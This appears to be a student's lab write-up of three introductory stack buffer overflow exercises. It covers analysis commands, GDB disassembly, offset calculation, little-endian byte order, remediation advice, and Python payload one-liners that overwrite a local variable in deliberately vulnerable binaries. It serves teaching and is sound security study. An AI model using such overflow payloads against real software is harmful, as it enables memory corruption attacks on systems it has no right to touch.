# Hole in bin
# Binary Analysis Commands

## Navigate

```bash

cat README.txt
```

## Static Analysis

### Identify the Binary

```bash
file bin
```

### Check Security Protections

```bash
checksec --file=bin
```

### Extract Strings

```bash
strings bin
```

### ELF Information

```bash
readelf -h bin
readelf -l bin
readelf -S bin
readelf -s bin
```

### Shared Libraries

```bash
ldd bin
```

### Disassemble

```bash
objdump -d bin
objdump -M intel -d bin
objdump -d bin | grep "<main>"
objdump -d bin | less
```

---

# Dynamic Analysis (GDB)

### Launch GDB

```bash
gdb ./bin
```

### Inside GDB

```gdb
disassemble main
break main
run
run AAAA
continue
next
step
finish

info registers
info locals
info variables
info functions
backtrace

x/32xb $esp
x/16wx $esp
x/20i $eip
```

---

# Radare2

```bash
r2 bin
```



---

# Binary Information

```bash
ls -l
stat bin
xxd bin | head
hexdump -C bin | head
sha256sum bin
md5sum bin
```

---

# Typical Workflow

```bash

file bin
checksec --file=bin
strings bin
readelf -h bin
readelf -l bin
readelf -S bin
readelf -s bin
ldd bin

objdump -M intel -d bin

gdb ./bin
# Inside GDB:
# disassemble main
# break main
# run
# next
# step
# info registers
# x/32xb $esp

./bin
```
# ex00 – Stack Buffer Overflow (Overwriting a Local Variable)

## Objective

The goal of this challenge is to display the following message:

```text
you have changed the 'modified' variable
```

This challenge introduces the concept of a **stack buffer overflow** by demonstrating how writing beyond the limits of a local buffer can overwrite adjacent variables stored on the stack.

---

## Initial Analysis

Before interacting with the binary, I gathered information using several analysis tools.

### Identify the Binary

```bash
file bin
```

Result:

- 32-bit ELF executable (Intel i386)
- Dynamically linked
- Not stripped

Since the binary is not stripped, function names and some variable information remain available, making reverse engineering easier.

---

### Security Protections

```bash
checksec --file=bin
```

Results:

- No RELRO
- No Stack Canary
- NX Disabled
- No PIE

These protections are intentionally disabled because this binary is designed as a learning exercise for stack-based buffer overflows.

---

### Extract Useful Strings

```bash
strings bin
```

Interesting output:

```text
you have changed the 'modified' variable
Try again?
gets
puts
```

The presence of the `gets()` function immediately suggests a possible buffer overflow because `gets()` performs no bounds checking on user input.

---

### Symbol Information

```bash
readelf -s bin
```

Useful symbols found:

- `main`
- `buffer`
- `modified`

These symbols indicate that the program contains a local buffer and a variable named `modified`, which is likely the target of the exercise.

---

## Vulnerability Analysis

The binary reads user input using:

```c
gets(buffer);
```

Unlike safer alternatives such as:

```c
fgets(buffer, sizeof(buffer), stdin);
```

the `gets()` function has **no knowledge of the buffer size**.

If more bytes are entered than the buffer can store, the extra bytes continue writing into adjacent memory on the stack.

A simplified representation of the stack is:

```text
Higher Addresses
+----------------------+
| Return Address       |
+----------------------+
| Saved EBP            |
+----------------------+
| modified (int)       |
+----------------------+
| buffer[64]           |
+----------------------+
Lower Addresses
```

When more than 64 bytes are entered:

- The buffer becomes full.
- The following bytes overwrite the `modified` variable.
- Since `modified` is no longer zero, the success condition is satisfied.

---

## Exploitation

Run the binary:

```bash
./bin
```

Input:

```text
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

Output:

```text
you have changed the 'modified' variable
```

The character `A` has the hexadecimal value:

```text
0x41
```

Therefore, the integer `modified` becomes something similar to:

```text
0x41414141
```

Because this value is not zero, the program prints the success message.

---

## Why the Exploit Works

The program checks whether the variable `modified` has changed.

Conceptually, the logic is similar to:

```c
if (modified != 0)
{
    puts("you have changed the 'modified' variable");
}
```

Since the overflow overwrites `modified`, the condition becomes true.

Unlike later binary exploitation challenges, this level does **not** require control of the return address or execution flow. The objective is simply to overwrite a nearby stack variable.

---

## Commands Used

```bash
file bin

checksec --file=bin

strings bin

readelf -s bin

objdump -d bin

gdb ./bin

./bin
```

---

## Key Concepts Learned

- ELF executable identification
- Stack memory layout
- Local variables stored on the stack
- Buffer overflow fundamentals
- Unsafe use of `gets()`
- Using `strings` to identify program behavior
- Using `readelf` to inspect symbols
- Using `objdump` and `gdb` for binary analysis

---

## Remediation

This vulnerability can be prevented by:

- Replacing `gets()` with `fgets()`.
- Performing proper bounds checking on all user input.
- Compiling with stack protection (`-fstack-protector`).
- Enabling Non-Executable memory (NX).
- Enabling Position Independent Executables (PIE).
- Enabling RELRO.
- Keeping Address Space Layout Randomization (ASLR) enabled.

---

## Key Takeaway

This challenge demonstrates one of the most fundamental memory corruption vulnerabilities: the **stack buffer overflow**.

By writing beyond the boundaries of a local buffer, an attacker can modify adjacent memory. In this exercise, only a local variable is overwritten, but the same principle forms the basis for more advanced attacks that overwrite saved return addresses, redirect execution flow, and ultimately achieve arbitrary code execution.


---
###

# ex01 – Stack Buffer Overflow (Overwriting a Variable with a Specific Value)

## Objective

The goal of this challenge is to display the following success message:

```text
you have correctly got the variable to the right value
```

Unlike **ex00**, where the objective was only to make the variable `modified` non-zero, this challenge requires overwriting the variable with an **exact hexadecimal value**.

This exercise introduces two essential binary exploitation concepts:

- Calculating memory offsets from assembly code.
- Understanding **little-endian** representation on x86 processors.

---

# Initial Analysis

Before attempting the exploit, I analyzed the binary to understand its structure and identify potential vulnerabilities.

## Identify the Binary

```bash
file bin
```

Result:

- ELF 32-bit executable (Intel i386)
- Dynamically linked
- Not stripped

Because the binary is not stripped, symbol names remain available, making reverse engineering easier.

---

## Check Security Protections

```bash
checksec --file=bin
```

The binary intentionally disables several modern protections to allow stack overflow exploitation.

Typical protections observed:

- No RELRO
- No Stack Canary
- NX Disabled
- No PIE

These disabled protections simplify learning by making memory layout predictable.

---

## Inspect Strings

```bash
strings bin
```

Interesting strings:

```text
you have correctly got the variable to the right value
Try again
```

Unlike the previous exercise, the success message indicates that the variable must contain a **specific value**, not simply any non-zero value.

---

## Inspect Symbols

```bash
readelf -s bin
```

Interesting imported functions:

```text
strcpy
printf
puts
errx
```

The presence of `strcpy()` immediately suggests a possible buffer overflow because `strcpy()` copies data without checking the destination buffer size.

---

# Program Behavior

Running the program without arguments:

```bash
./bin
```

Output:

```text
bin: please specify an argument
```

This indicates that the program expects user input through the command-line arguments (`argv`).

Running with a small argument:

```bash
./bin AAAA
```

Output:

```text
Try again, you got 0x00000000
```

Running with a long input:

```bash
./bin $(python3 -c 'print("A"*100)')
```

Output:

```text
Try again, you got 0x41414141
Segmentation fault
```

This confirms that:

- A stack overflow exists.
- The variable `modified` is overwritten with the hexadecimal value `0x41414141`.
- The overflow eventually reaches the saved return address, causing a segmentation fault.

The value `0x41414141` corresponds to four ASCII characters:

```text
'A' = 0x41
```

---

# Reverse Engineering with GDB

The `main` function was examined using GDB.

```bash
gdb ./bin
```

Inside GDB:

```gdb
disassemble main
```

The most important instructions are:

```asm
movl $0x0,0x5c(%esp)
```

This initializes the variable:

```c
modified = 0;
```

---

```asm
lea 0x1c(%esp), %eax
```

`LEA` (Load Effective Address) loads the address of the input buffer.

Therefore:

```text
buffer -> esp + 0x1c
```

---

```asm
call strcpy
```

Equivalent C code:

```c
strcpy(buffer, argv[1]);
```

Because `strcpy()` performs no bounds checking, user input may overwrite adjacent memory.

---

```asm
mov 0x5c(%esp), %eax
cmp $0x61626364, %eax
```

Equivalent C logic:

```c
if (modified == 0x61626364)
```

This instruction reveals the exact value required to solve the challenge.

---

# Calculating the Offset

The stack locations are:

```text
buffer   -> esp + 0x1c
modified -> esp + 0x5c
```

Subtracting the addresses:

```text
0x5c - 0x1c = 0x40
```

Convert to decimal:

```text
0x40 = 64
```

Therefore:

```text
Buffer size = 64 bytes
```

The first 64 bytes fill the buffer.

The following four bytes overwrite the `modified` variable.

---

# Understanding Little Endian

The comparison is made against:

```text
0x61626364
```

Breaking it into bytes:

```text
61 62 63 64
```

ASCII representation:

```text
61 -> a
62 -> b
63 -> c
64 -> d
```

However, Intel x86 processors use **Little Endian** byte ordering.

Therefore the bytes must be stored in memory as:

```text
64 63 62 61
```

Which corresponds to:

```text
d c b a
```

This is why writing `"abcd"` would fail.

The correct byte sequence is:

```text
\x64\x63\x62\x61
```

---

# Crafting the Payload

Payload layout:

```text
64 bytes of padding
+
target value (little endian)
```

Python payload:

```python
b"A"*64 + b"\x64\x63\x62\x61"
```

Because Python 3 prints UTF-8 text by default, raw bytes are generated using `sys.stdout.buffer.write()`.

```bash
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*64+b"\x64\x63\x62\x61")'
```

Execute the binary:

```bash
./bin "$(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*64+b"\x64\x63\x62\x61")')"
```

Output:

```text
you have correctly got the variable to the right value
```

The exploit successfully overwrites the `modified` variable with the expected value.

---

# Why the Exploit Works

The stack layout is approximately:

```text
Higher Addresses
+----------------------+
| Return Address       |
+----------------------+
| Saved EBP            |
+----------------------+
| modified             |
+----------------------+
| buffer[64]           |
+----------------------+
Lower Addresses
```

The first 64 bytes completely fill the buffer.

The next four bytes overwrite `modified`.

Because the overwritten value matches `0x61626364`, the comparison succeeds and the program prints the success message.

Unlike later binary exploitation challenges, this exercise still does **not** require controlling execution flow or overwriting the return address.

---

# Commands Used

```bash
file bin

checksec --file=bin

strings bin

readelf -s bin

objdump -d bin

gdb ./bin

disassemble main

./bin

./bin AAAA

./bin $(python3 -c 'print("A"*100)')

./bin "$(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*64+b"\x64\x63\x62\x61")')"
```

---

# Key Concepts Learned

- Stack buffer overflow
- Command-line arguments (`argv`)
- Unsafe use of `strcpy()`
- Reading assembly with GDB
- Calculating stack offsets
- Memory layout
- Hexadecimal representation
- ASCII encoding
- Little-endian byte ordering
- Constructing exploit payloads
- Overwriting local variables

---

# Remediation

This vulnerability can be prevented by:

- Replacing `strcpy()` with `strncpy()` or another bounded copy function.
- Validating the length of all user input before copying.
- Compiling with Stack Canaries (`-fstack-protector`).
- Enabling Non-Executable memory (NX).
- Enabling Position Independent Executables (PIE).
- Enabling Full RELRO.
- Keeping ASLR enabled.
- Performing secure code reviews to detect unsafe memory operations.

---

# Key Takeaway

This challenge extends the previous exercise by demonstrating that successful exploitation often requires writing an **exact value** into memory rather than simply corrupting it.

It also introduces one of the most important concepts in binary exploitation: **little-endian encoding**. Understanding how integers are stored in memory is essential for later challenges involving return addresses, function pointers, Return-Oriented Programming (ROP), and advanced memory corruption techniques.

By analyzing the assembly, calculating the buffer offset, and constructing the payload manually, this challenge reinforces the fundamental workflow used in real-world binary exploitation and reverse engineering.


# ex02 – Stack Buffer Overflow Using an Environment Variable

## Objective

The goal of this challenge is to display the following success message:

```text
you have correctly modified the variable
```

Unlike the previous challenge, where the vulnerable input was passed as a command-line argument (`argv`), this exercise stores the user-controlled input inside an **environment variable**. The objective is to overflow a local stack buffer and overwrite a nearby variable with the expected value.

This challenge introduces another common source of user-controlled input in native applications: **environment variables**.

---

# Initial Analysis

Before attempting the exploit, I analyzed the binary to understand its behavior and identify possible vulnerabilities.

---

## Identify the Binary

```bash
file bin
```

Expected information:

* ELF 32-bit executable (Intel i386)
* Dynamically linked
* Not stripped

Because the binary is not stripped, symbol names remain available, making reverse engineering easier.

---

## Check Security Protections

```bash
checksec --file=bin
```

The binary intentionally disables several security mechanisms because it is designed for learning binary exploitation.

Typical protections observed:

* No RELRO
* No Stack Canary
* NX Disabled
* No PIE

These disabled protections simplify stack overflow exploitation by making the memory layout predictable.

---

## Extract Useful Strings

```bash
strings bin
```

Interesting strings include:

```text
GREENIE
please set the GREENIE environment variable
you have correctly modified the variable
Try again
```

The string **GREENIE** immediately indicates that the program expects an environment variable rather than command-line input.

---

## Inspect Symbols

```bash
readelf -s bin
```

Interesting imported functions:

```text
getenv
strcpy
printf
puts
errx
```

The presence of `getenv()` indicates that user input is read from an environment variable.

The use of `strcpy()` immediately suggests a possible buffer overflow because it copies data without checking the destination buffer size.

---

# Program Behavior

Running the program without setting the required environment variable:

```bash
./bin
```

Output:

```text
bin: please set the GREENIE environment variable
```

This confirms that the program expects an environment variable named:

```text
GREENIE
```

---

# Reverse Engineering with GDB

The binary was analyzed using GDB.

```bash
gdb ./bin
```

Inside GDB:

```gdb
disassemble main
```

The important instructions are shown below.

---

## Reading the Environment Variable

```asm
call getenv
```

Equivalent C code:

```c
char *greenie = getenv("GREENIE");
```

Instead of reading input from `argv`, the program loads the value stored in the environment variable.

---

## Initializing the Variable

```asm
movl $0x0,0x58(%esp)
```

Equivalent C code:

```c
modified = 0;
```

The variable starts with the value zero.

---

## Buffer Address

```asm
lea 0x18(%esp), %eax
```

The `LEA` instruction loads the address of the local buffer.

Therefore:

```text
buffer -> esp + 0x18
```

---

## Copying User Input

```asm
call strcpy
```

Equivalent C code:

```c
strcpy(buffer, greenie);
```

Since `strcpy()` performs no bounds checking, an input larger than the destination buffer continues writing into adjacent memory.

This is the source of the vulnerability.

---

## Required Value

Later in the function:

```asm
mov 0x58(%esp), %eax
cmp $0x0d0a0d0a, %eax
```

Equivalent C code:

```c
if (modified == 0x0d0a0d0a)
```

This instruction reveals the exact value that the variable must contain.

---

# Calculating the Offset

The assembly shows:

```text
buffer   -> esp + 0x18
modified -> esp + 0x58
```

Subtracting the addresses:

```text
0x58 - 0x18 = 0x40
```

Convert to decimal:

```text
0x40 = 64
```

Therefore:

```text
Buffer size = 64 bytes
```

The first 64 bytes completely fill the buffer.

The following four bytes overwrite the variable `modified`.

---

# Understanding the Target Value

The comparison value is:

```text
0x0d0a0d0a
```

Breaking it into bytes:

```text
0d
0a
0d
0a
```

ASCII meaning:

| Hex  | Character            |
| ---- | -------------------- |
| 0x0d | Carriage Return (CR) |
| 0x0a | Line Feed (LF)       |

The processor stores integers using **Little Endian** format.

Therefore the bytes written after the 64-byte buffer must correspond to the little-endian representation of the target integer.

The payload bytes are:

```text
\x0a\x0d\x0a\x0d
```

---

# Building the Payload

The payload layout is:

```text
64 bytes padding
+
target value
```

Python payload:

```python
b"A"*64 + b"\x0a\x0d\x0a\x0d"
```

Python 3 prints UTF-8 text by default, so raw bytes are generated using:

```python
import sys
sys.stdout.buffer.write(b"A"*64+b"\x0a\x0d\x0a\x0d")
```

---

# Exploitation

Export the environment variable:

```bash
export GREENIE=$(python3 -c 'import sys;sys.stdout.buffer.write(b"A"*64+b"\x0a\x0d\x0a\x0d")')
```

Run the binary:

```bash
./bin
```

Output:

```text
you have correctly modified the variable
```

The exploit succeeds because:

* The first 64 bytes fill the local buffer.
* The next four bytes overwrite the variable `modified`.
* The overwritten value matches `0x0d0a0d0a`.
* The comparison succeeds, and the program prints the success message.

---

# Stack Layout

Approximate stack layout:

```text
Higher Addresses
+----------------------+
| Return Address       |
+----------------------+
| Saved EBP            |
+----------------------+
| modified             |
+----------------------+
| buffer[64]           |
+----------------------+
Lower Addresses
```

The overflow affects `modified` before reaching the saved frame pointer and return address.

---

# Commands Used

## Static Analysis

```bash
file bin

checksec --file=bin

strings bin

readelf -s bin

objdump -d bin
```

---

## Dynamic Analysis

```bash
gdb ./bin

disassemble main

break main

run

next

step

continue
```

---

## Exploitation

Run without the environment variable:

```bash
./bin
```

Create the payload:

```bash
python3 -c 'import sys;sys.stdout.buffer.write(b"A"*64+b"\x0a\x0d\x0a\x0d")'
```

Export the environment variable:

```bash
export GREENIE=$(python3 -c 'import sys;sys.stdout.buffer.write(b"A"*64+b"\x0a\x0d\x0a\x0d")')
```

Execute the exploit:

```bash
./bin
```

---

# Tools Used

* GDB
* objdump
* readelf
* strings
* file
* checksec
* Python 3
* Bash

---

# Concepts Learned

* Stack buffer overflow
* Environment variables
* `getenv()`
* Unsafe use of `strcpy()`
* Static analysis
* Dynamic analysis with GDB
* Reading assembly instructions
* Stack memory layout
* Buffer offset calculation
* Little-endian representation
* Payload construction
* Overwriting adjacent stack variables

---

# Remediation

This vulnerability can be prevented by:

* Replacing `strcpy()` with safer alternatives such as `strncpy()` or `memcpy()` with explicit bounds checking.
* Validating the length of environment variable input before copying it into a fixed-size buffer.
* Compiling with Stack Canaries (`-fstack-protector`).
* Enabling NX (Non-Executable Stack).
* Enabling PIE (Position Independent Executables).
* Enabling Full RELRO.
* Keeping ASLR enabled.
* Performing secure code reviews to identify unsafe memory operations.

---

# Key Takeaway

This challenge demonstrates that **environment variables are another source of untrusted input**. Any externally controlled data copied into a fixed-size buffer without proper bounds checking can become a stack buffer overflow vulnerability.

Compared to **ex01**, the exploitation technique remains the same, but the input source changes from command-line arguments to an environment variable. This reinforces an important security principle: **the danger comes from unsafe memory operations such as `strcpy()`, not from the source of the input itself**.

By analyzing the assembly, identifying the vulnerable function, calculating the stack offset, understanding little-endian byte ordering, and constructing the payload manually, this exercise further develops the core skills required for reverse engineering and binary exploitation.
